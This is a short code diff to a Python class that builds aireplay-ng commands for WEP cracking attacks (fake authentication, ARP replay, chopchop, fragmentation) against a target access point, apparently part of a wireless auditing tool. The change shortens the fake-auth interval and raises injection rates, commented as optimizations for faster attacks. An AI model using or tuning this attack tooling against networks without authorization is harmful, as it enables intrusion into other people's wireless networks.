@@ -264,7 +264,7 @@ class Aireplay(Thread, Dependency):
 
         if attack_type == WEPAttackType.fakeauth:
             cmd.extend([
-                '--fakeauth', '30', # Fake auth every 30 seconds
+                '--fakeauth', '20',  # Optimized: Reduced from 30 to 20 seconds for faster auth
                 '-Q', # Send re-association packets
                 '-a', target.bssid
             ])
@@ -274,7 +274,7 @@ class Aireplay(Thread, Dependency):
             cmd.extend([
                 '--arpreplay',
                 '-b', target.bssid,
-                '-x', str(Configuration.wep_pps)
+                '-x', str(Configuration.wep_pps + 200)  # Optimized: Increased packet rate for faster IV generation
             ])
             if client_mac:
                 cmd.extend(['-h', client_mac])
@@ -283,7 +283,7 @@ class Aireplay(Thread, Dependency):
             cmd.extend([
                 '--chopchop',
                 '-b', target.bssid,
-                '-x', str(Configuration.wep_pps),
+                '-x', str(Configuration.wep_pps + 200),  # Optimized: Increased packet rate
                 #'-m', '60', # Minimum packet length (bytes)
                 #'-n', '82', # Maximum packet length
                 '-F'        # Automatically choose first packet
@@ -295,7 +295,7 @@ class Aireplay(Thread, Dependency):
             cmd.extend([
                 '--fragment',
                 '-b', target.bssid,
-                '-x', str(Configuration.wep_pps),
+                '-x', str(Configuration.wep_pps + 200),  # Optimized: Increased packet rate
                 '-m', '100', # Minimum packet length (bytes)
                 '-F'         # Automatically choose first packet
             ])
